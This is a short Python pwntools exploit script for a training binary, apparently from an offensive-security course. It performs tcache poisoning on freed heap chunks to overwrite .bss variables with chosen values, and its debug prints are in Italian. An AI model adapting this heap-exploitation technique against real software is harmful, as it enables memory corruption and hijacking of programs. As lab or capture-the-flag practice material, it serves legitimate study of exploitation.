from pwn import*

r = process("./playground")
#r = remote("bin.training.offdef.it", 10101)

gdb.attach(r,
'''
b *(main+243)
''')

input("wait")

def malloc(n):
	r.sendline(b"malloc " + bytes(str(n),encoding="utf-8"))
	r.recvuntil(b"==> ")
	pointer = r.recv()[:-1]
	return pointer

def free(pointer):
	r.sendline(b"free " + pointer)
	r.recv()

def write(pointer,n,what_to_write):
	r.sendline(b"write " + pointer + b" " + bytes(str(n),encoding="utf-8"))
	r.send(what_to_write)
	r.recv()

r.recvuntil(b"main: ")
app = r.recv()[:-3]
main = int(app,16)

print("PROVA -> stampa main address")
print(hex(main))


bss_max_heap_offset = 0x2EC7
arbitrary_chunk_max_heap = main + bss_max_heap_offset

bss_malloc_offset = 0x2E47
arbitrary_chunk_malloc = main + bss_malloc_offset


chunk1 = malloc(0x60)
chunk2 = malloc(0x60)

free(chunk1)
free(chunk2)

write(chunk2, 0x10, p64(arbitrary_chunk_max_heap))
print("WRITE PER MAX HEAP FATTA")
malloc(0x60)
malloc(0x60)
print("MALLOC FATTE PER MAX HEAP")

free(chunk1)
free(chunk2)

print("FREE FATTE")

write(chunk2, 0x10, p64(arbitrary_chunk_malloc))

print("WRITE FATTA PER MALLOC")

malloc(0x60)
chunk3 = malloc(0x60)

write(chunk3, 0x10, p64(0xAAAAAAAAAAAAAAAA))
print("WRITE FATTA DELLA A")

malloc(0x60)

p.interactive()